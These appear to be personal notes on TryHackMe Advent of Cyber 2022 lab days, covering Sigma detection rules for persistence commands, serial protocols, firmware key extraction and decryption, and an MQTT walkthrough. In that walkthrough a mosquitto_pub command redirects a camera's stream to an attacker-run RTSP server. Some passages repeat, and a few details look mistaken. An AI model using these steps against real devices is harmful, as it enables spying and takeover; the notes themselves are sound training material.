- gmail , amg , yahoo , fedfull, tryhackme, hotmail, alfa, canary

Filtering for Emails: What is the domain of the email with the local-part "lewisham44"?
- `amg.com`

Filtering for Emails: What is the domain of the email with the local-part "maxximax"?
- `fedfull.com`

Filtering for Emails: What is the local-part of the email with the domain name "hotmail.com"?
- `hussain.volt`


Filtering for URLs: Starts with either http or https; some of the URLs have "www", and a TLD should exist.

Filtering for URLs: How many URLs fit the syntax provided?
- `egrep 'http(s)?.{3}(www)?.+\..+$' strings  | wc -l`
- 16

Filtering for URLs: How many of these URLs start with "https"?
- 7 

## Day 18 - Sigma 

#### Threat Detection

Cyber threats and criminals have advanced tactics to ensure that they steal information and cause havoc. 
- prepare their defences and identify these threats
- proactive approaches to analyzing different logs, malware and network traffic. = threat detection.

Unified Kill Chain
- persistence = making local user account
- discovery = get info about target
- execution of malicious code 

MITRE ATTACK
```
account_creation = {eventID: 4720, service: security}

software_discovery = {
	category: process creation,
	eventID: 1,
	service: Sysmon,
	image: C:\Windows\System32\reg.exe,
	commandLine: `reg query “HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer” /v svcVersion`
	}
	
sched_task = {
	category: process creation,
	eventID: 1,
	service: Sysmon,
	image: C:\Windows\System32\schtasks.exe,
	parent_image: C:\Windows\System32\cmd.exe,
	commandLine: `schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"`
} 

```


create and write your sigma rule in text editor
run  -- submit your sigma rule, check if malicious

`http://10.10.137.1` 
Sigma app uses YAML 

`your_sigma_rule.yml`
```YAML
title:
id: #UUID
status: 
description:
author:
date:
modified:

logsource:
	product: # windows, linux , macos
	service: # ssd 
	category: # firewall, web, antivirus
detection:
	selection:
		{FieldName1: Value} # change me
	condition: selection # action to be taken

falsepositives: # legit service or use
level: # info
tags:
	- {attack.tactic} # MITRE ATTACK
	- {attack.technique}

```

create rule

```
title: Suspicious Local Account Creation 
id: 0f06a3a5-6a09-413f-8743-e6cf35561297 
status: experimental 
description: Detects the creation of a local user account on a computer
product: windows
service: security
```

flag 1  `THM{n0t_just_your_u$ser} `

Log > TargetUserName: `BanditYetiMini` 

- **Software Discovery**: Category, EventID, Image, CommandLine.

```
software discovery
windows
service: Sysmon
eventID: 2

Image|endswith:
- reg.exe
CommandLine|contains|all:
- reg
- query
- /v
- svcVersion
```


flag 2 ` THM{wh@t_1s_Runn1ng_H3r3} `
users path `SIGMA_AOC2022\BanditYeti `

- **Scheduled Jobs**: Category, EventID, Image, CommandLine.

```
Image|endswith:
- schtask.exe
CommandLine|contains|all:
- schtasks
- /create

level: low
```

flag 3 ` THM{sch3dule_0npo1nt_101} `
  
What was the MD5 hash associated with Challenge #3 logs?
`2F6CE97FAF2D5EEA919E4393BDD416A7`

## Day 19 - Hardware hacking

Hardware hacking is often shrouded in mystery and seen as a super complex topic. While there are a lot of in-depth complex hardware hacking components, getting our feet wet is actually pretty simple.

Think about the Transmission Control Protocol (TCP), which has multiple redundancies in place! It even sends three full packets just to start its communication!

microchips
- digital communication 0s, 1s = bits
- binary representation of ASCII characters
- specific digital protocols sending data

USART
Universal Synchronous/Asynchronous Receiver-Transmitter (USART) communication , serial communication is a protocol that uses 2 wires
- 1 wire is TX transmit data from device A to B 
- 1 wire is RX receive data on device A from B
- the 3rd wire is `Ground (GND)` which is required to allow the devices to have same voltage reference
- the voltage level is binary
- 4th wire is `Chip Select`  which distinguishes the devices that the communication is meant for
- no clock = no synchronization of communication = Start & Stop bits
- communication speed `baud rate` or `bit rate` . how fast bytes of data can be sent
- `bits per transmission` a set of 8 bits = `1 byte` or `16 bits`
- `parity bits` to check for errors in communication, detect and correct errors

TX --> RX
```
_._  = start bit
-- = 0, 1
__ = 3,4,5,7 (data bits)
_|_ = stop bit

-- idle -- _._ -- -- __ __ -- __ -- __ _|_
                1  1  0  0  1 0  1  0

11001010 = 0x53 = 's'
```

devices use a `Clear to Send (CTS)` and `Request to Send (RTS)` 
to communicate to determine if other device is ready to transmit data


SPI 

The Serial Peripheral Interface (SPI) communication protocol is mainly used for communication between microprocessors and small peripherals such as a sensor or an SD card.
- has separate clock wire `(SCK)` 
- DATA line

Clock ---> Clock
Data ---> Data
```
# this is faster 

clock _^_^_^_^_^_^_^_^
       0 1 2 3 4 5 6 7

Data - - _ - _ - _ 
     1 1 0 1 0 1 0 

0x53 = 's'
```
 1 wire is TX transmit data from device A to B 
- 1 wire is RX receive data on device A from B
- the 3rd wire is `Ground (GND)` which is required to allow the devices to have same voltage reference
- the voltage level is binary
- no clock = no synchronization of communication = Start & Stop bits
- communication speed `baud rate` or `bit rate` . how fast bytes of data can be sent
- `bits per transmission` a set of 8 bits = `1 byte` or `16 bits`
- `parity bits` to check for errors in communication, detect and correct errors

a `controller` only device allowed to send clock signals
`peripheral in controller out (PICO)` communication is sent from the controller and the `peripheral out controller in (POCI)` communication is sent from 2nd device back to controller. 

SCK ---> SCK
PICO ---> PICO
POCI <--- POCI
```
(A) = SCK clock from controller
(B) = peripheral to controller
(A) -_-_-_-_-_-_-----(B)---_-_-_-_-_-_

PICO --__-_-_-------
     11001010 = 0x53 = 's'

POCI --------_--___-_-
             011000101  = 0x46 = 'F'
```

all devices use the same SCK PICO and POCI lines

 1 wire is TX transmit data from device A to B 
- 1 wire is RX receive data on device A from B
- the 3rd wire is `Ground (GND)` which is required to allow the devices to have same voltage reference
- the voltage level is binary
- 4th wire is `Chip Select`  which distinguishes the devices that the communication is meant for
- no clock = no synchronization of communication = Start & Stop bits
- communication speed `baud rate` or `bit rate` . how fast bytes of data can be sent
- `bits per transmission` a set of 8 bits = `1 byte` or `16 bits`
- `parity bits` to check for errors in communication, detect and correct errors

```
1 = SCK
2 = PICO
3 = POCI
4 = CS
			 1 2 3 4        1 2 3 4        1 2 3 4
             peripheral_1   peripheral_2   peripheral_3
controller
- SCK      --^--------------^--------------^
- PICO     ----^--------------^--------------^
- POCI     ------^--------------^--------------^
- CS1      --------^
- CS2      -----------------------^
- CSn      --------------------------------------^
```


I2C 

The Inter-Integrated Circuit (I2C) communication protocol was created to deal with the drawbacks of both the USART and SPI communication protocols.

- USART = asynch, clock built in, devices must agree to config for communication, slow speed
- SPI = faster, reliable, more wires, every additional peripheral needs `Chip Select` wire

IS2 uses 2 lines of communication
- `serial data (SDA)`
- `serial clock (SCL)` 
- address signal sent on the SDA wire (not chip select) , directs communication traffic
- after signal sent a data signal sends the actual communication
- 1008 devices can be connected to the same lines and able to communicate

ESP32 microchip allows for WiFi and Mobile networks
digital communication can be intercepted with Logic Analyzer , looking at the wires 
- black wire connects to GND pin
- red wire connects to VIN pin (voltage in)
- green & purple wire = data transmission , connected to RX0 and TX0
- TX0 and RX0 = USART protocol
- connect the probes of Logic Analyzer to green & purple wires

AttackBox desktop > open Logic 2
File > Open Capture > Santa

`D0, D1` = digital channels
`A0, A1` = analogue data

Analyzer tab (right) > Async Serial tab (top)
```
input channel   01 channel 1
bit rate        4800

```
click on Terminal icon 
```
\xF7\xfe\xff\xfe\0ack reboot cmdx195837 9600
```

add another channel `+` icon > async channel (same info except for channel 0)
the terminal has new info (the discussion with ESP32 device)
- The processor asks the ESP32 to reboot its connection to the control server.
- The ESP32 is happy to oblige but requests a security code to be sent to allow connection to the control server
- Once the security code has been transmitted, the ESP32 allows the microprocessor to negotiate a new baud rate to be used for communication
the output is not readable but we have baud rate

edit our channel 0 analyzer to the new baud rate 
`Async Serial [1]` click on the 3 vertical dots, change baud to 9600

---
What device can be used to probe the signals being sent on electrical wires between two devices?
- logic analyzer

USART is faster than SPI for communication? (Yea,Nay)
- nay

USART communication uses fewer wires than SPI? (Yea,Nay)
- yea

USART is faster than I2C for communication? (Yea,Nay)
- nay

I2C uses more wires than SPI for communication? (Yea,Nay)
- nay

SPI is faster than I2C for communication? (Yea,Nay)
- yea

What is the maximum number of devices that can be connected on a single pair of I2C lines?
- 1008

What is the new baud rate that is negotiated between the microprocessor and ESP32 chip?
- 9600

What is the flag that is transmitted once the new baud rate was accepted?
- ` THM{hacking.hardware.is.fun} `


## Day 20 - Firmware

#ReverseEngineering 

Every embedded system, such as cameras, routers, smart watches etc enables the **hardware to communicate with other software running on the device**. The firmware provides low-level control for the designer/developer to make changes at the root level.

Reverse engineering is working your way back through the code to figure out how it was built and what it does.

Firmware reverse engineering is extracting the original code from the firmware binary file and verifying that the code does not carry out any malicious or unintended functionality like undesired network communication calls.

**Reversing steps**
1. get the firmware: from website or device
2. extract firmware (binary file)
3. firmware is encrypted , requires a tricky workaround (Side channel attack to get the key)
4. decrypt firmware, reverse engineer 


Type of firmware analysis

**Static analysis** 
- examine binary file > rev engineer > read Assembly instructions
- `BinWalk` extracts `.zip .tar .exe .ELF` .  extract a file system (`squashfs, yaffs2, cramfs, ext*fs, jffs2`)
- `Firmwalk modkit (FMK)` outputs a directory once code is extracted
- `Firmwalker` searches the extracted firmware file system for unique strings & directories (`etc/shadow, etc/passwd, etc/ssl`) special keywords `admin, root, password, ssh, telnet, netcat` etc 

**Dynamic Analysis**
- run analysis on the hardware and observe behaviour , debugging 
- advantage: analyze unintended network communication for IDing data theft
- `Qemu` is open source emulator, can help with ELF (Executable & Linkable Format) files 
- `GNU DeBugger (GDB)` debugging tool for emulating a binary and inspecting its memory and registers

Start the AttackBox  `Santa1010`

Terminal `dir`
- `binwalk -E -N`
- FMK extraction and modification `extract-firmware.sh`

STEP 1
```
cd bin
ls
firmwarev2.2-encrypted.gpg
binwalk -E -N firmwarev2.2-encrypted.gpg

# rising entropy edge = encrypted and increased randomness
```

STEP 2
```
cd ..
ls
cd bin-unsigned/
firmwarev1.0-unsigned
# use older version to find encryption key to decrypt firmware

extract-firmware.sh firmwarev1.1-unsigned
Santa1010

firmware parts /home/test/bin-unsigned/fmk/*
```

STEP 3
```
# need to find a public and private key + paraphrase to decrypt originally signed firmware
# unencrypted firmware is in fmk/

bin-unsigned/
grep -ir key

# lots of output but at the bottom shows 
fmk/rootfs/gpg/public.key:----BEGIN PGP PUBLIC KEY BLOCK----
fmk/rootfs/gpg/public.key:----BEGIN PGP PRIVATE KEY BLOCK----

# now find the paraphrase
grep -ir paraphrase

fmk/rootfs/gpg/secret.txt:PARAPHRASE: Santa@2022

```

STEP 4
```
# we have the keys, import private key
gpg --import fmk/rootfs/gpg/private.key
# input the passphrase Santa@2022

# import public key
gpg --import fmk/rootfs/gpg/public.key

# shows McSkidy <mcskidy@santagift.shop> not changed

gpg --list-secret-keys

# sec rsa3072 514B4994E9B3E47A4F89507A56013838A8C14EC1

cd ..
cd bin/
ls
firmwarev2.2-encrypted.gpg
gpg firmwarev2.2-encrypted.gpg
ls 
firmwarev2.2-encrypted  firmwarev2.2-encrypted.gpg

```

STEP 5
```
# can use binwalk or FMK to extract code, example uses fMK

extract-firmware.sh firmwarev2.2-encrypted
# enter Santa1010
# Firmware parts /home/test/bin/fmk/

ls
image/   parts/   logs/    rootfs/

cd rootfs/

Camera/  flag.txt  

cat flag.txt
```

  
What is the flag value after reversing the file firmwarev2.2-encrypted.gpg?
- ` THM{WE_GOT_THE_FIRMWARE_CODE} `

What is the Paraphrase value for the binary firmwarev1.0_unsigned?
- `Santa@2022`

After reversing the encrypted firmware, can you find the build number for rootfs?
- `ls -lah *`
- ` 2.6.31 `

## Day 21 - MQTT

The **Internet of Things** (**IoT**) defines a categorization of just that, “things”. Devices are interconnected and rely heavily on communication to achieve a device’s objectives. Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.

- IoT category of unique devices  _smart X_
- devices are interconnected using human interaction  (not required)
- device A uses protocol X , device B uses protocol Y != compatible 

**Intro to IoT Protocols**

Protocol for any IoT device for 
- machine 2 machine 
- machine 2 gateway 
- machine 2 cloud communications

protocol objective = efficient, reliable, secure data
- IoT data protocol - TCP/IP model (HTTP, SMB, FTP, etc)
- IoT network protocol - Wireless (wifi, bluetooth ZigBee, Z-Wave) tech for communication

Messaging protocols & middleware
- IoT devices send & receive messages or payload between parties
- `middleware` = messaging protocols communications between 2 devices via indep. server
- lightweight & efficient
```
[client A] --> IoT protocol --> Middleware ---> HTTP data --> [Client B]
[client A] <-- IoT protocol <-- Middleware <--- HTTP data <-- [Client B]
```

**popular messaging protocols for IoT devices**

```
MQTT = {
	protocol: message queing telemetry transport,
	communication_method: middleware,
	description: relies on publish/subscribe model to send/receive messages
}

CoAP = {
	protocol: constrained app protocol,
	communication: middleware,
	description: translates HTTP communication for medium/lightweight devices
}

AMQP = {
	protocol: advanced message queing protocol,
	communication: middleware,
	description: transactional to receive, queue and store messages between devices
}

DDS = {
	protocol: data distributed service,
	communication: device-to-device,
	description: communication from traditional devices to lightweight devices or large data communication
}

websocket = {
	protocol: websocket,
	communication: device-to-device,
	description: relies on client-server model to send data over TCP connection
}
```


the MQTT model
- publish/subscribe model
```
publish --> msg from publisher --> Broker 
	Broker ---> msg from publisher --> subscriber
	Broker <-- are there messages? <-- subscriber
```

- this model works for 1 broker and 1 device objective
- message format `<name>/<id>/<function>`
- broker stores or overwrites message under topic and relay it to subscribers who have subscribed
```
Publisher A ----> msg: ABCD Topic: A ---> Broker --> Topic: A msg: ABCD
Publisher B ----> msg: 1234 Topic: B ---> Broker --> Topic: B msg: 1234
```

multiple subscribers receiving separate topics
- async communication
```
Broker:
Topic: A msg: ABCD 
--> any messages from Topic A? 
---> subscriber A msg: ABCD

subscriber B:
--> any messages from Topic B? 
--> Broker: Topic B msg: 1234
<-- msg: 1234
```



example of MQTT = thermostat

similar to HTTP

Our data should follow CIA (Confidentiality, Integrity, and Availability) best practices as closely as possible;
- data should not be read or manipulated by unauth sources
- should be accessible to auth users

device with MQTT , publisher sends data to device
attacker could send malicious code to device or to another application

`insecure` allows attacker to exploit a vulnerability
but does not mean its inherently vulnerable 

attacker discover devices 
- communication sniffing to determine protocol , middleware
- ex: unencrypted HTTP sent to central server translated to CoAP packets, watch the HTTP packets and look for message
- source code analysis 
- documentation 

behaviour identified > interact with devices >send malicious code

device ID
devices exchange device ID to communicate

---

web camera, uses MQTT protocol, list of potential topics we can target

**libraries to interact with MQTT**
- `Paho` Python library
- `Mosquitto` suite of MQTT utilities that include publish/subscribe  & command line

SUBSCRIBE TO A TOPIC
- `mosquitto_sub`
- default utility will connect to localhost broker
- define topic `-t or -topic`
- `mosquitto_sub -t device/ping`
- `-h` specify broker `-h example.thm`

PUBLISHING TO A TOPIC
- `mosquitto_pub` 
- `-m or -message` flag to denote message/payload
- `mosquitto_pub -h example.thm -t device/info -m "this is example" `

flags:
- `-d` debug messages
- `-i or -id` id the client
- `-p or -port`  port broker is using, default is `1883`
- `-u or -username` username for authentication
- `-P or -password` password for authentication
- `-url` specify username, password, host, port, topic

AttackBox 

```
ping 10.10.65.26
nmap -p- 10.10.65.26  # but that's no smart, MQTT default is 1883
nmap -sS -sV -p 1883 10.10.65.26

# 1883/tcp mosquitto version 1.6.9

# nmap default script
nmap -sS -sV -sC -p 1883 10.10.65.26

PORT     STATE SERVICE                 VERSION
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/clients/maximum: 6
|     $SYS/broker/load/bytes/sent/15min: 515.50
|     $SYS/broker/load/messages/sent/15min: 15.25
|     $SYS/broker/load/bytes/received/1min: 274.38
|     $SYS/broker/load/messages/received/15min: 5.70
|     $SYS/broker/clients/active: 4
|     $SYS/broker/heap/current: 58216
|     $SYS/broker/publish/messages/received: 74
|     $SYS/broker/messages/stored: 38
|     $SYS/broker/load/bytes/received/15min: 135.02
|     $SYS/broker/load/messages/sent/1min: 43.41
|     $SYS/broker/load/connections/15min: 0.41
|     $SYS/broker/load/messages/received/1min: 11.55
|     $SYS/broker/clients/total: 6
|     $SYS/broker/clients/connected: 4
|     $SYS/broker/load/publish/sent/5min: 23.85
|     $SYS/broker/load/publish/received/1min: 5.81
|     device/init: JUQGOQX0RH714YRQXIWM
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/sockets/5min: 0.74
|     $SYS/broker/uptime: 748 seconds
|     $SYS/broker/load/publish/received/15min: 3.35
|     $SYS/broker/bytes/received: 2974
|     $SYS/broker/store/messages/count: 38
|     $SYS/broker/retained messages/count: 41
|     $SYS/broker/messages/received: 125
|     $SYS/broker/store/messages/bytes: 184
|     $SYS/broker/messages/sent: 312
|     $SYS/broker/publish/bytes/sent: 2331
|     $SYS/broker/load/connections/1min: 1.89
|     $SYS/broker/load/connections/5min: 0.74
|     $SYS/broker/publish/messages/sent: 263
|     $SYS/broker/load/publish/sent/15min: 13.01
|     $SYS/broker/bytes/sent: 10389
|     $SYS/broker/load/messages/received/5min: 9.41
|     $SYS/broker/load/publish/sent/1min: 37.72
|     $SYS/broker/load/bytes/sent/5min: 951.00
|     $SYS/broker/load/sockets/1min: 1.88
|     $SYS/broker/load/bytes/received/5min: 222.17
|     $SYS/broker/load/sockets/15min: 0.41
|     $SYS/broker/load/messages/sent/5min: 27.65
|     $SYS/broker/publish/bytes/received: 1480
|     $SYS/broker/subscriptions/count: 8
|_    $SYS/broker/load/bytes/sent/1min: 1546.63


# subscribe 
mosquitto_sub -h 10.10.x.x -t device/init

JUQGOQX0RH714YRQXIWM     # gets updated, Ctrl + C

```

- device topics =  `device/init` device ID , `device/<id>/cmd` subscribes to device id specific topic to receive commands & settings
- ` device/init: JUQGOQX0RH714YRQXIWM `
- device is known a `RSTP (real time streaming protocol)` for input streaming `device/<id>/cmd` 

we have the source code snippet to look at `IoTdevice.py` which is a web camera

build a message JSON
` {”CMD”:value,”URL”:"value"} `
source code has `target_cmd = "10" `
the url value should be `eth0 or ens0` 
`RSTP://x.x.x.x:8554/path`


`{"cmd": "10", "url": "<listening url>" }`

start a RTSP server with Docker

```
docker run --rm -it --network=host aler9/rtsp-simple-server

# ... RTSP listerner 8554

# {"cmd": "10", "url": "rtsp://10.10.19.10:8554/path" }

# new tab in terminal
mosquitto_pub -h 10.10.65.26 -t device/JUQGOQX0RH714YRQXIWM/cmd -m """{"cmd":"10","url":"rtsp://10.10.19.10:8554/hackingfun"}"""

# look at listening terminal tab, shows connection
# RTSP [conn 10.10.65.26:57754]

# other tab
vlc rtsp://127.0.0.1:8554/hackingfun

# opens VLC 
THM{UR_CAMERA_IS_MINE}

```


What port is `Mosquitto` running on?
- 1883

Is the _device/init_ topic enumerated by Nmap during a script scan of all ports? (y/n)
- Y

What `Mosquitto` version is the device using?
- 1.6.9
  
What flag is obtained from viewing the RTSP stream?
- `  THM{UR_CAMERA_IS_MINE} `


## Day 22 - attack surface redux

ATTACK VECTORS
An attack vector is a tool, technique, or method used to attack a computer system or network.
- phishing emails
- denial of service
- distributed denial of service attack
- web drive by attacks - flaws in web browser that compromise security of the victim by visiting a website
- unpatched vulnerabilities  exploitation 

ATTACK SURFACE
The attack surface is the surface area of the victim of an attack that can be impacted by an attack vector and cause damage.
- email server for send/receive emails
- internet facing web server 
- end user machines that people use to connect to the network
- human can be manipulated {social engineering}

ATTACK SURFACE REDUX

- open SSH pot on webserver ==> close unnecessary ports
- doc file with malicious macros opened by user ==> block macros on network
- sensitive data on server is found on file sharing website ==> remove sensitive data
- spoofed phishing emails sent to employees ==> phishing protection
- password brute forcing attack attempted on account ==> use strong passwords
- employee finds USB plugs in computer= malware ==> app locker is used 

` THM{4tt4ck surf4c3 r3duc3d } `

## Day 23 - defence in depth

Defence in Depth is mainly focused on disrupting adversarial objectives; that is, the shift of focus from ‘just’ securing the perimeter to securing everything in the path that the adversary will have to take from the perimeter to the crown jewels.

3 levels of defence
1. focus on perimeter security, Web App Firewalls (WAFs)
2. defence layers in place , emphasis on prevention (network segmentation)
3. strategy of sensors, analytics, preventive measures

GAME
Santa’s Executive Assistant (EA) receives a spear phishing email.
establishing foothold
the Bad Yeti immediately realizes that the EA doesn’t have access to the Naughty or Nice list.
start enumerating
gets hands on the list

CASE 1 ---------
Santa's Executive Assistant office
- desk drawer
- Santa's vault password `S3cr3tV@ultPW `

Santa's office
- vault
- enter password
- naughty or nice book
- ` THM{EZ_fl@6!} `

CASE 2 --------
`MilkAndCookies` EA office note
Santa office `MilkAndCookies `
`vault: 3XtR@_S3cr3tV@ultPW `

CASE 3 -------
```
# EA office
BanoffeePie      

H0tCh0coL@t3_01  # old pw in trash
H0tCh0coL@t3_02  # new pw


S3cr3tV@ultPW 
Pr0v3dV@ultPW 

N3w4nd1mPr0v3dV@ultPW 

THM{D3f3n5e_1n_D3pth_1s_k00L!!}
```


` THM{AoC2022!thank_you!} `

